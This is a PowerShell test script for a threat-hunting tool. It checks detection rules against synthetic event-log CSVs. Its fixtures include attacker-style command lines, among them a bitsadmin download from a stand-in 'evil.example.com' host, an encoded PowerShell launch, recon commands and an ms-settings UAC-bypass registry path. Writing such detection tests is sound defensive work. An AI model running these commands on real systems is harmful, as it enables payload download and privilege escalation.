$repoScript = Join-Path (Split-Path -Parent $PSScriptRoot) "Ophira.ps1"
# v2.20 - APT depth: structured parses (EID 10/13/2, 4688/4698/5140/5145, Defender 5001/5007),
# hunt rules R8-R15, verdict wiring, Get-EventDataRows helper, fleet lateral-chain stitching
$ErrorActionPreference = 'Stop'
$src = Get-Content -LiteralPath "$repoScript" -Raw

$pass = 0; $fail = 0
function Check([string]$label, [bool]$ok) {
    if ($ok) { $script:pass++; Write-Host "  [ok] $label" -ForegroundColor Green }
    else { $script:fail++; Write-Host "  [FAIL] $label" -ForegroundColor Red }
}
$stamp = Get-Date -Format 'HHmmss'
function New-Csv { param($Path, [string[]]$Header, [string[]]$Lines) ($Header + $Lines) | Set-Content -LiteralPath $Path -Encoding UTF8 }

# ============================================================================
# PART 1 - hunt rules R8-R15 through the real function
# ============================================================================
$defs = ''
foreach ($n in @('Import-CaseCsv', 'Test-IsPublicIp', 'Test-IsUserWritablePath', 'New-HuntFindings')) {
    $m = [regex]::Match($src, "(?s)function $n\b.*?\r?\n\}")
    if (-not $m.Success) { throw "extract failed: $n" }
    $defs += $m.Value + "`r`n"
}
Invoke-Expression $defs
$case1 = Join-Path $env:TEMP "ophira_h220_$stamp"
$CsvDir = Join-Path $case1 'csv'
New-Item -ItemType Directory -Path $CsvDir -Force | Out-Null
$saved = @{}
function Save-Rows { param([string]$Name, $Rows) $script:saved[$Name] = $Rows }
function Write-CaseLog { param([string]$Message, [string]$Color = 'Gray') }
$Computer = 'TESTHOST'

# R8: non-system process opened lsass.exe (high) vs allowlisted svchost (nothing)
New-Csv (Join-Path $CsvDir 'sysmon_process_access.csv') '"Time","EventId","SourceImage","TargetImage","GrantedAccess","CallTrace"' @(
    '"2026-09-27 10:00:00","10","C:\Users\u\AppData\evil.exe","C:\Windows\system32\lsass.exe","0x1010","C:\Windows\SYSTEM32\ntdll+0x9b000|UNKNOWN"',
    '"2026-09-27 10:01:00","10","C:\Windows\System32\svchost.exe","C:\Windows\system32\lsass.exe","0x1010","ok"'
)
# R9 (office -> powershell) + R10 (encoded high, bitsadmin medium) + R13 (recon storm) + negatives
New-Csv (Join-Path $CsvDir 'security_proc_events.csv') '"Time","EventId","Account","NewProcess","CommandLine","ParentProcess"' @(
    '"2026-09-27 09:00:00","4688","user1","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","powershell.exe -enc SQBFAFgA","C:\Users\u\AppData\Local\Microsoft\Windows\INetCache\WINWORD.EXE"',
    '"2026-09-27 09:02:00","4688","user1","C:\Windows\System32\bitsadmin.exe","bitsadmin /transfer job1 http://evil.example.com/x.exe C:\x.exe","C:\Windows\System32\cmd.exe"',
    '"2026-09-27 09:03:00","4688","user1","C:\Windows\System32\notepad.exe","notepad.exe","C:\Windows\explorer.exe"',
    '"2026-09-27 09:10:00","4688","recon","C:\Windows\System32\whoami.exe","whoami.exe","C:\Windows\System32\cmd.exe"',
    '"2026-09-27 09:10:01","4688","recon","C:\Windows\System32\net.exe","net view /domain","C:\Windows\System32\cmd.exe"',
    '"2026-09-27 09:10:02","4688","recon","C:\Windows\System32\nltest.exe","nltest /dclist:corp","C:\Windows\System32\cmd.exe"',
    '"2026-09-27 09:10:03","4688","recon","C:\Windows\System32\systeminfo.exe","systeminfo","C:\Windows\System32\cmd.exe"',
    '"2026-09-27 09:10:04","4688","recon","C:\Windows\System32\ipconfig.exe","ipconfig /all","C:\Windows\System32\cmd.exe"',
    '"2026-09-27 09:10:05","4688","recon","C:\Windows\System32\quser.exe","quser","C:\Windows\System32\cmd.exe"',
    '"2026-09-27 09:10:06","4688","recon","C:\Windows\System32\netstat.exe","netstat -ano","C:\Windows\System32\cmd.exe"',
    '"2026-09-27 09:11:00","4688","svc","C:\Windows\System32\whoami.exe","whoami.exe","C:\Windows\System32\svchost.exe"'
)
# R11: ms-settings command hijack (medium)
New-Csv (Join-Path $CsvDir 'sysmon_registry.csv') '"Time","EventId","EventType","TargetObject","Image"' @(
    '"2026-09-27 10:05:00","13","SetValue","HKU\S-1-5-21-1234\Software\Classes\ms-settings\shell\open\command","C:\Users\u\AppData\evil.exe"',
    '"2026-09-27 10:05:01","13","SetValue","HKU\S-1-5-21-1234\Software\Classes\ms-settings\shell\open\command\DelegateExecute","C:\Users\u\AppData\evil.exe"'
)
# R12: admin-share WriteData on exe/dll (high); ReadData-only + non-admin share = nothing
New-Csv (Join-Path $CsvDir 'security_share_access.csv') '"Time","EventId","Account","ShareName","RelativeTargetName","SourceIp","AccessList"' @(
    '"2026-09-27 10:10:00","5145","CORP\admin","\\\\*\\ADMIN$","payload.dll","10.0.0.50","%%4415"',
    '"2026-09-27 10:10:01","5145","CORP\admin","\\\\*\\ADMIN$","readme.txt","10.0.0.50","%%4415"',
    '"2026-09-27 10:10:02","5145","CORP\admin","\\\\*\\ADMIN$","tool.exe","10.0.0.50","%%4414"',
    '"2026-09-27 10:10:03","5145","CORP\admin","\\\\*\\Users","tool.exe","10.0.0.50","%%4415"'
)
# R14: RT protection off (high) + exclusion change (high) + unrelated config change (nothing)
New-Csv (Join-Path $CsvDir 'defender_config_events.csv') '"Time","EventId","Detail"' @(
    '"2026-09-27 10:20:00","5001","real-time protection disabled"',
    '"2026-09-27 10:21:00","5007","Exclusions\Paths changed to C:\tools"',
    '"2026-09-27 10:22:00","5007","Engine version updated"'
)
# R15: timestomping (medium)
New-Csv (Join-Path $CsvDir 'sysmon_file_time.csv') '"Time","EventId","Image","TargetFilename","CreationUtcTime","PreviousCreationUtcTime"' @(
    '"2026-09-27 10:30:00","2","C:\Users\u\AppData\evil.exe","C:\Windows\System32\svc.dll","2005-01-01 00:00:00","2026-09-27 10:29:59"'
)

New-HuntFindings

$hf = @($saved['hunt_findings'])
Check "R8: LSASS access from evil.exe = high" (@($hf | Where-Object { $_.Rule -match 'LSASS access' -and $_.Entity -match 'evil\.exe' -and $_.Severity -eq 'high' }).Count -eq 1)
Check "R8: allowlisted svchost NOT flagged" (@($hf | Where-Object { $_.Rule -match 'LSASS access' -and $_.Entity -match 'svchost' }).Count -eq 0)
Check "R9: WINWORD -> powershell chain = high" (@($hf | Where-Object { $_.Rule -match 'Office app spawned interpreter' -and $_.Entity -match 'winword\.exe -> powershell\.exe' }).Count -eq 1)
Check "R10: encoded command = high" (@($hf | Where-Object { $_.Rule -match 'encoded command' -and $_.Severity -eq 'high' }).Count -eq 1)
Check "R10: bitsadmin = medium" (@($hf | Where-Object { $_.Rule -match 'bitsadmin' -and $_.Severity -eq 'medium' }).Count -eq 1)
Check "R10: benign parent/child NOT flagged" (@($hf | Where-Object { $_.Rule -match 'proxy-execution' -and $_.Entity -match 'notepad' }).Count -eq 0)
Check "R11: ms-settings hijack = medium" (@($hf | Where-Object { $_.Rule -match 'UAC bypass pattern' -and $_.Severity -eq 'medium' }).Count -ge 1)
Check "R12: admin-share payload.dll WriteData = high" (@($hf | Where-Object { $_.Rule -match 'Admin-share executable staging' -and $_.Evidence -match 'payload\.dll' }).Count -eq 1)
Check "R12: ReadData-only / txt / non-admin-share NOT flagged" (@($hf | Where-Object { $_.Rule -match 'Admin-share' -and $_.Evidence -match 'readme|tool\.exe' }).Count -eq 0)
Check "R13: discovery storm for recon = medium" (@($hf | Where-Object { $_.Rule -match 'Discovery command storm' -and $_.Entity -eq 'recon' }).Count -eq 1)
Check "R13: single whoami for svc NOT flagged" (@($hf | Where-Object { $_.Rule -match 'Discovery command storm' -and $_.Entity -eq 'svc' }).Count -eq 0)
Check "R14: RT protection disabled = high" (@($hf | Where-Object { $_.Rule -match 'real-time protection DISABLED' }).Count -eq 1)
Check "R14: exclusion change = high" (@($hf | Where-Object { $_.Rule -match 'exclusion configuration changed' }).Count -eq 1)
Check "R14: unrelated 5007 NOT flagged" (@($hf | Where-Object { $_.Rule -match 'exclusion configuration changed' -and $_.Evidence -match 'Engine version' }).Count -eq 0)
Check "R15: timestomping = medium" (@($hf | Where-Object { $_.Rule -match 'timestomping' -and $_.Severity -eq 'medium' }).Count -eq 1)

# ============================================================================
# PART 2 - verdict wiring: new high rules = floor-2 signal + structured telemetry coverage
# ============================================================================
$vd = ''
foreach ($n in @('Import-CaseCsv', 'Get-CompromiseVerdict')) {
    $m = [regex]::Match($src, "(?s)function $n\b.*?\r?\n\}")
    if (-not $m.Success) { throw "extract failed: $n" }
    $vd += $m.Value + "`r`n"
}
Invoke-Expression $vd
$case2 = Join-Path $env:TEMP "ophira_v220_$stamp"
$CsvDir = Join-Path $case2 'csv'; $RawDir = Join-Path $case2 'raw'; $MemDir = Join-Path $case2 'mem'
New-Item -ItemType Directory -Path $CsvDir, $RawDir -Force | Out-Null
$Sysmon = $true; $LogHours = 168
function Test-IsAdmin { $true }
function Get-ToolsDir { $null }
foreach ($n in @('hunt_findings', 'security_proc_events')) {
    if ($n -eq 'hunt_findings') { $rows = @($saved['hunt_findings']) } else { $rows = @(Import-Csv (Join-Path $case1 'csv\security_proc_events.csv')) }
    $rows | Export-Csv -LiteralPath (Join-Path $CsvDir "$n.csv") -NoTypeInformation -Encoding UTF8
}
foreach ($empty in @('flash_process_scored', 'flash_ioc_hits', 'ioc_hits_amcache', 'yara_hits', 'hayabusa_timeline', 'defender_threats', 'logging_gaps', 'security_bruteforce_candidates', 'beacon_candidates', 'dns_beacon_candidates', 'usn_write_bursts', 'asep_sweep', 'memory_malfind', 'ioc_hits_browser', 'entities_binaries')) {
    "# no entries" | Set-Content -LiteralPath (Join-Path $CsvDir "$empty.csv") -Encoding UTF8
}
$v = Get-CompromiseVerdict
Check "verdict: hunt signal floor-2 still fires on R8-R15 highs" (@($v.Signals | Where-Object { "$($_.Signal)" -match 'Hunt technique' -and $_.Weight -eq 2 }).Count -eq 1)
Check "verdict: rank >= SUSPICIOUS from hunt alone" ($v.LevelRank -ge 2)
Check "coverage: structured telemetry row present" (@($v.Coverage | Where-Object { "$($_.Source)" -match 'Structured telemetry' -and $_.Collected }).Count -eq 1)

# ============================================================================
# PART 3 - Get-EventDataRows helper (live smoke against the System log)
# ============================================================================
$gd = ''
foreach ($n in @('Get-EventDataRows')) {
    $m = [regex]::Match($src, "(?s)function $n\b.*?\r?\n\}")
    if (-not $m.Success) { throw "extract failed: $n" }
    $gd += $m.Value + "`r`n"
}
Invoke-Expression $gd
$none = Get-EventDataRows -LogName 'System' -Id @(999999) -Fields ([ordered]@{ X = 'Nope' })
Check "helper: no-match ID returns empty without throwing" (@($none).Count -eq 0)
$boot = @(Get-EventDataRows -LogName 'System' -Id @(6005) -Fields ([ordered]@{ Foo = 'Bar' }))
Check "helper: real event keeps Time+EventId and maps missing field to empty" ($boot.Count -eq 0 -or ($boot[0].EventId -eq 6005 -and "$($boot[0].Foo)" -eq '' -and "$($boot[0].Time)" -ne ''))

# ============================================================================
# PART 4 - structural wiring: SIEM, fleet lateral chain, whitelist, huntHi regex
# ============================================================================
Check "whitelist: Get-EventDataRows in SharedFunctions" ($src -match "'Get-EventDataRows'")
Check "verdict: huntHi regex covers new high rules" ($src -match "LSASS access\|Office app spawned\|proxy-execution\|Admin-share staging")
Check "siem: hunt_finding kind exported" ($src -match "kind'\] = 'hunt_finding'")
Check "fleet: lateral chain output + join sources present" ($src -match 'fleet_lateral_chain\.csv' -and $src -match 'security_share_access\.csv' -and $src -match 'net_interfaces\.csv')
Check "fleet: HuntHit finding type mapped" ($src -match "'hunt_findings\.csv'\s+= 'HuntHit'")
Check "modules: structured parses save the 7 new CSVs" (@(@('sysmon_process_access', 'sysmon_registry', 'sysmon_file_time', 'security_proc_events', 'security_task_install', 'security_share_access', 'defender_config_events') | Where-Object { $src -notmatch "Save-Rows -Name '$($_)' " }).Count -eq 0)

Write-Host ""
Write-Host "RESULT: $pass passed, $fail failed" -ForegroundColor $(if ($fail -eq 0) { 'Green' } else { 'Red' })
foreach ($d in @($case1, $case2)) { Remove-Item -LiteralPath $d -Recurse -Force -ErrorAction SilentlyContinue }
if ($fail -gt 0) { exit 1 } else { exit 0 }
